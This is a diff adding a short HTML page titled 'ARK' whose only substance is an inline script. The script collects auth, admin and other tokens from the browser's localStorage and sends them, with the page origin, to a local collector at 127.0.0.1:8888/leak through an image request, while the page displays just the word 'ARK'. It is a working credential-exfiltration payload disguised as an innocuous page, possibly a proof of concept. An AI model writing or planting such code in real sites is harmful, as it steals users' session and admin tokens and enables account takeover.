@@ -1,0 +1,8 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>ARK</title></head><body>
+<script>
+var o={};
+['ark_token','admin_token','ark_auth_addr','ark_addr','ark_ref_code','ark_noti','ark_snapshots'].forEach(function(k){try{o[k]=localStorage.getItem(k)}catch(e){}});
+o.origin=location.origin;
+new Image().src='http://127.0.0.1:8888/leak?d='+encodeURIComponent(JSON.stringify(o));
+document.body.textContent='ARK';
+</script></body></html>
